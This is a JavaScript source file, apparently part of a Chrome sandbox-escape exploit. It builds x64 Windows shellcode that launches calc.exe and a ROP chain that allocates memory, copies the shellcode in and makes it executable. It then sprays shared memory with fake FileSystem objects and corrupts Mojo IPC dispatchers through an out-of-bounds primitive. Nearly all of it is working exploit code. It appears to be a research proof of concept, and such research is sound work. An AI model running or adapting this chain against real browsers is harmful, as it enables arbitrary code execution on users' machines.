// 204: 0xcc
// 144: 0x90
function build_shellcode() {
    let ab = new ArrayBuffer(0x512);
    let u8ab = new Uint8Array(ab);
    u8ab.set(new Uint8Array(
      [   0x90,
          0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
          0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52,
          0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
          0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED,
          0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88,
          0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
          0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48,
          0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1,
          0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
          0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49,
          0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A,
          0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
          0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B,
          0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
          0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47,
          0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x2E,
          0x65, 0x78, 0x65, 0x00
      ]));
    let shellcode = new DataView(ab);
    return shellcode;
}
  
function build_rop() {
    let stack = new DataView(new ArrayBuffer(kRopSize));
    let i = 0;

    function push(value) {
        stack.setBigUint64(i, value, true);
        i += 8;
    }

    function call(fn_ptr, arg0=0x2323232323232323n, arg1=0x2323232323232323n, arg2=0x2323232323232323n, arg3=0x2323232323232323n) {
        push(pop_gadget_ptr);

        push(arg1); // rdx
        push(arg0); // rcx
        push(arg2); // r8
        push(arg3); // r9
        push(0x2323232323232323n);
        push(0x2323232323232323n);
        push(fn_ptr);

        // leave scratch space
        push(pop_gadget_ptr);
        push(0x2323232323232323n);
        push(0x2323232323232323n);
        push(0x2323232323232323n);
        push(0x2323232323232323n);
        push(0x2323232323232323n);
        push(0x2323232323232323n);
    }

    function chained_call(fn_ptr, arg1=0x2323232323232323n, arg2=0x2323232323232323n, arg3=0x2323232323232323n) {
        // first load arg1, arg2, arg3 into rdx, r8, r9 preserving rax, then move
        // rax into rcx and call the function
        push(pop_gadget_ptr);

        push(arg1); // rdx
        push(0x2323232323232323n);
        push(arg2); // r8
        push(arg3); // r9
        push(0x2323232323232323n);
        push(0x2323232323232323n);
        if (mov_rcx_rax_gadget_ptr != 0n) {
            push(mov_rcx_rax_gadget_ptr);
        }
        else {
            push(shell32_mov_rcx_rax_gadget_ptr);
            push(shell32_mov_rax_rcx_gadget_ptr);
        }

        push(0x2323232323232323n);
        push(0x2323232323232323n);
        push(0x2323232323232323n);
        push(0x2323232323232323n);
        push(0x2323232323232323n);
        push(fn_ptr);

        // leave scratch space
        push(pop_gadget_ptr);
        push(0x2323232323232323n);
        push(0x2323232323232323n);
        push(0x2323232323232323n);
        push(0x2323232323232323n);
        push(0x2323232323232323n);
        push(0x2323232323232323n); 
    }

    call(virtual_alloc_ptr, 0n, 0x1000n, 0x3000n, 0x4n);
    chained_call(memcpy_ptr, kPtrToStartOfShellCode, BigInt(kShellcodeSize));
    chained_call(virtual_protect_ptr, BigInt(kShellcodeSize), 0x20n, kPtrToStartOfShellCode);
    push(jmp_rcx_gadget_ptr);

    return stack;
}

function build_page() {
  
    let size = kPageSize
  
    let page = new DataView(new ArrayBuffer(size));
    let stack = build_rop();
    let shellcode = build_shellcode();
  
    const kFileSystemOperationRunnerPtrBaseAddressOffset = 0x000;
    const kFileSystemOperationRunnerPtr = kSprayPtr + BigInt(kFileSystemOperationRunnerPtrBaseAddressOffset);
  
    const kFileSystemContextPtrBaseAddressOffset = 0x020;
    const kFileSystemContextPtr = kSprayPtr + BigInt(kFileSystemContextPtrBaseAddressOffset);
  
    const kFileSystemBackendNodePtrBaseAddressOffset = 0x0a0;
    const kFileSystemBackendNodePtr = kSprayPtr + BigInt(kFileSystemBackendNodePtrBaseAddressOffset);
  
    const kSomeValuePtrBaseAddressOffset = 0x100;
    const kSomeValuePtr = kSprayPtr + BigInt(kSomeValuePtrBaseAddressOffset);
  
    const kSomeValueAgainPtrBaseAddressOffset = 0x120;
    const kSomeValueAgainPtr = kSprayPtr + BigInt(kSomeValueAgainPtrBaseAddressOffset);
  
    const kThisShouldPointToHeapPtrWhichPointsToStartOfRopBaseAddressOffset = 0x200;
    const kThisShouldPointToHeapPtrWhichPointsToStartOfRop = kSprayPtr + BigInt(kThisShouldPointToHeapPtrWhichPointsToStartOfRopBaseAddressOffset);
  
    const kSomeValueAgainAgainPtrBaseAddressOffset = 0x2a0;
    const kSomeValueAgainAgainPtr = kSprayPtr + BigInt(kSomeValueAgainAgainPtrBaseAddressOffset);
  
    const kHeapPtrToStartOfRopBaseAddressOffset = 0x300;
    const kHeapPtrToStartOfRop = kSprayPtr + BigInt(kHeapPtrToStartOfRopBaseAddressOffset);
  
    // kFileSystemOperationRunnerPtr
    page.setBigUint64(kFileSystemOperationRunnerPtrBaseAddressOffset + 0x0, 0xdeadbeefn, true); // kFileSystemOperationRunnerPtr
    page.setBigUint64(kFileSystemOperationRunnerPtrBaseAddressOffset + 0x8, kFileSystemContextPtr, true); // should point to kFileSystemContextPtr
  
    // kFileSystemContextPtr
    page.setBigUint64(kFileSystemContextPtrBaseAddressOffset + 0x78, kFileSystemBackendNodePtr, true); // kFileSystemBackendNodePtr
  
    // kFileSystemBackendNodePtr
    page.setBigUint64(kFileSystemBackendNodePtrBaseAddressOffset + 0x8, kSomeValuePtr, true); // kSomeValuePtr, needs to be bigger than 
    page.setBigUint64(kFileSystemBackendNodePtrBaseAddressOffset + 0x20, 0x0n, true);
    page.setBigUint64(kFileSystemBackendNodePtrBaseAddressOffset + 0x28, kThisShouldPointToHeapPtrWhichPointsToStartOfRop, true); // kFileSystemBackendPtr
  
    // kSomeValuePtr
    page.setBigUint64(kSomeValuePtrBaseAddressOffset + 0x0, kSomeValueAgainPtr, true); // kSomeValueAgainPtr
    page.setBigUint64(kSomeValuePtrBaseAddressOffset + 0x19, 0x0n, true);
    page.setBigUint64(kSomeValuePtrBaseAddressOffset + 0x28, kThisShouldPointToHeapPtrWhichPointsToStartOfRop, true); // kFileSystemBackendPtr
  
    // kSomeValueAgainPtr
    page.setBigUint64(kSomeValueAgainPtrBaseAddressOffset + 0x19, 0x1n, true);
  
    // kFileSystemBackendPtr / kThisShouldPointToHeapPtrWhichPointsToStartOfRop
    page.setBigUint64(kThisShouldPointToHeapPtrWhichPointsToStartOfRopBaseAddressOffset + 0x0, kSomeValueAgainAgainPtr, true); // kSomeValueAgainAgainPtr
    page.setBigUint64(kThisShouldPointToHeapPtrWhichPointsToStartOfRopBaseAddressOffset + 0x10, kHeapPtrToStartOfRop, true); // kHeapPtrToStartOfRop
    page.setBigUint64(kThisShouldPointToHeapPtrWhichPointsToStartOfRopBaseAddressOffset + 0x50, ret_gadget_ptr, true); // rdx
  
    // kSomeValueAgainAgainPtr
    page.setBigUint64(kSomeValueAgainAgainPtrBaseAddressOffset + 0x38, pivot_gadget_ptr, true); // will jmp rdx at the end, so rdx should be a ret
  
    // kHeapPtrToStartOfRop
    for (var i = 0; i < stack.byteLength; ++i) {
      page.setUint8(kHeapPtrToStartOfRopBaseAddressOffset + i, stack.getUint8(i));
    }
  
    // kPtrToStartOfShellCode
    for (var i = 0; i < shellcode.byteLength; ++i) {
      page.setUint8(kPtrToStartOfShellCodeBaseAddressOffset + i, shellcode.getUint8(i));
    }
  
    return page;
}

// function build_pattern_page() {
//     //let calc_size = 0x1000
//     //let rev__size = 0x6000
//     //let size = rev__size
//     let size = kPageSize
//     let ab = new ArrayBuffer(size)
//     let page = new DataView(ab);
//     for (let a = 0; a < 0x100; a++) {
//         page.setBigUint64(0x000+(a*8), 0x4141414141414141n+BigInt(a), true);
//     }
//     return page;
// }

function spray(oob) {
    log('[5] spray');
  
    function get_mojo_handle(oob, object) {
      let object_ptr = oob.objToPtr(object);
      let object_handle_ptr = oob.getUint64(object_ptr + 0x20n);
      let object_handle = oob.getUint32(object_handle_ptr + 0x10n);
      return object_handle;
    }
  
    let shared_memory = Mojo.createSharedBuffer(kHugePageSize).handle;
    let shared_memory_handle = get_mojo_handle(oob, shared_memory);
  
    log('[*] initializing shared memory');
    var page = build_page();
    var page_view = new DataView(page.buffer);
    for (var i = 0; i < kHugePageSize / kPageSize; i += 1) {
      let shared_buffer = shared_memory.mapBuffer(i * kPageSize, kPageSize);
      let shared_view = new DataView(shared_buffer.buffer);
      for (var j = 0; j < kPageSize; j += 4) {
        shared_view.setUint32(j, page_view.getUint32(j));
      }
    }
  
    log('[*] creating pipes and dupes');
    let pipes = [];
    let dupes = [];
    let pipe_handles = new Set([]);
    let dupe_handles = new Set([]);

    for (var i = 0; i < kOptimisedPipesNumber; ++i) { // a00 c88 original 2*0xc88
      let pipe = Mojo.createDataPipe({elementNumBytes: 0x1, capacityNumBytes: kShellcodePageSize});
      let dupe = shared_memory.duplicateBufferHandle();
      let pipe_handle = get_mojo_handle(oob, pipe.consumer);
      let dupe_handle = get_mojo_handle(oob, dupe.handle);
  
      pipes.push(pipe);
      dupes.push(dupe);
      pipe_handles.add(pipe_handle);
      dupe_handles.add(dupe_handle);
    }
  
    let mojo_core_ptr = oob.getUint64(chrome_child.base + kChromeChildCoreOffset);
    let mojo_handles_ptr = oob.getUint64(mojo_core_ptr + 0x20n); // this is the member handles_ of the mojo::Core object.
  
    let pipe_dispatchers = [];
    let dupe_dispatchers = [];
  
    var list_node_ptr = oob.getUint64(mojo_handles_ptr + 0x10n);
    let list_length = oob.getUint64(mojo_handles_ptr + 0x18n);
    for (var i = 0; i <= list_length; ++i) {
      let list_node_handle = oob.getUint32(list_node_ptr + 0x10n);
      let list_node_dispatcher = oob.getUint64(list_node_ptr + 0x18n);
      if (pipe_handles.has(list_node_handle)) {
        pipe_dispatchers.push(list_node_dispatcher);
      } else if (dupe_handles.has(list_node_handle)) {
        dupe_dispatchers.push(list_node_dispatcher);
      }
      list_node_ptr = oob.getUint64(list_node_ptr);
    }
  
    for (var i = 0; i < pipe_dispatchers.length && i < dupe_dispatchers.length; ++i) {
      oob.memswap(pipe_dispatchers[i] + 0x80n,dupe_dispatchers[i] + 0x20n,0x28n);
      oob.setUint32(pipe_dispatchers[i] + 0x18n, 0x40000000);
      oob.setUint32(pipe_dispatchers[i] + 0x1cn, 0x40000000);
    }
  
    log('  [*] spraying');
    // let by_right = pipes.length
    // let by__left = 2000 // 1000 too small at least 3000
    // let bypass = by__left
  
    let ab = new ArrayBuffer(1);
    for (var i = 0; i < kOptimisedSprayIterations; ++i) {
      blob_registry_ptr.registerFromStream("", "", 0x1, pipes[i].consumer, null);
      pipes[i].producer.writeData(ab);
    }
  
    return () => {
      log('[7] freeing spray')
      let ab = new ArrayBuffer(0xfff);
      for (var i = 0; i < kOptimisedSprayIterations; ++i) {
        pipes[i].producer.writeData(ab);
      }
      log('[7] freeing spray2')
      for (var i = 0; i < kOptimisedSprayIterations; ++i) {
        pipes[i].producer.close();
      }
      for (var i = 0; i < dupes.length; ++i) {
        dupes[i].handle.close();
      }
      log('[7] done');
    };
  }
  